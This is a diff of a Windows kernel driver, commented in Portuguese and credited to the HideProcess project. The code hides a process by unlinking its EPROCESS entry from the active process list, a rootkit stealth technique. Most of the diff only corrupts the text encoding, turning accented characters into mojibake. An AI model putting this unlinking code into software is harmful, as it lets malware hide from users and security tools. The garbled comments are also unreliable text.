@@ -1,9 +1,10 @@
-
+ï»¿
 /*
 
-	Código obtido aqui: https://github.com/landhb/HideProcess/blob/master/driver/
+	CÃ³digo obtido aqui: https://github.com/landhb/HideProcess/blob/master/driver/
 
 */
+
 
 /// <summary>
 /// Procurar e descolar PID
@@ -19,7 +20,7 @@ ULONG ProcurarPID()
 	// Lista de PIDs para nossos 3 processos
 	ULONG pids[3];
 
-	// Lista de processos, conterá 3 processos
+	// Lista de processos, conterÃ¡ 3 processos
 	PEPROCESS eprocs[3];
 
 	// Selecione 3 PIDs de processo e obtenha seu Ponteiro de EPROCESS
@@ -35,10 +36,10 @@ ULONG ProcurarPID()
 
 
 	/*
-		Vá até a estrutura do EPROCESS e procure o PID
-		podemos começar em 0x20 porque UniqueProcessId deve
-		não estar nos primeiros 0x20 bytes,
-		também devemos parar após 0x300 bytes sem sucesso
+		VÃ¡ atÃ© a estrutura do EPROCESS e procure o PID
+		podemos comeÃ§ar em 0x20 porque UniqueProcessId deve
+		nÃ£o estar nos primeiros 0x20 bytes,
+		tambÃ©m devemos parar apÃ³s 0x300 bytes sem sucesso
 	*/
 
 	// Procure
@@ -88,7 +89,7 @@ VOID OcultarProcesso(_In_ UINT32 pid)
 	// Verifique a arquitetura usando o tamanho do ponteiro
 	INT_PTR ptr;
 
-	// Ptr tamanho 8 se compilado para uma máquina de 64 bits, 4 se compilado para uma máquina de 32 bits
+	// Ptr tamanho 8 se compilado para uma mÃ¡quina de 64 bits, 4 se compilado para uma mÃ¡quina de 32 bits
 	Lista += sizeof(ptr);
 
 	// Get current process
@@ -104,16 +105,16 @@ VOID OcultarProcesso(_In_ UINT32 pid)
 		return;
 	}
 
-	// Registre a posição inicial
+	// Registre a posiÃ§Ã£o inicial
 	PEPROCESS IniciarProcesso = ProcessoAtual;
 
-	// Mova o próximo item
+	// Mova o prÃ³ximo item
 	ProcessoAtual = (PEPROCESS)((ULONG_PTR)ListaAtual->Flink - Lista);
 	PIDAtual = (PUINT32)((ULONG_PTR)ProcessoAtual + PIDDeslocamento);
 	ListaAtual = (PLIST_ENTRY)((ULONG_PTR)ProcessoAtual + Lista);
 
-	// Faça um loop até encontrarmos o processo certo para remover
-	// Ou até voltarmos
+	// FaÃ§a um loop atÃ© encontrarmos o processo certo para remover
+	// Ou atÃ© voltarmos
 	while ((ULONG_PTR)IniciarProcesso != (ULONG_PTR)ProcessoAtual) {
 
 		// Veja o item
@@ -130,7 +131,7 @@ VOID OcultarProcesso(_In_ UINT32 pid)
 }
 
 /// <summary>
-/// Remover links (de acordo com o tradutor)
+/// Remover links
 /// </summary>
 /// <param name="Atual"></param>
 VOID RemoverLinks(_In_ PLIST_ENTRY Atual)
@@ -140,7 +141,7 @@ VOID RemoverLinks(_In_ PLIST_ENTRY Atual)
 	Anterior = (Atual->Blink);
 	Proxima = (Atual->Flink);
 
-	// Loop sobre si mesmo (conectar o anterior com o próximo)
+	// Loop sobre si mesmo (conectar o anterior com o prÃ³ximo)
 	Anterior->Flink = Proxima;
 	Proxima->Blink = Anterior;
 
@@ -148,3 +149,4 @@ VOID RemoverLinks(_In_ PLIST_ENTRY Atual)
 	Atual->Blink = (PLIST_ENTRY)&Atual->Flink;
 	Atual->Flink = (PLIST_ENTRY)&Atual->Flink;
 }
+
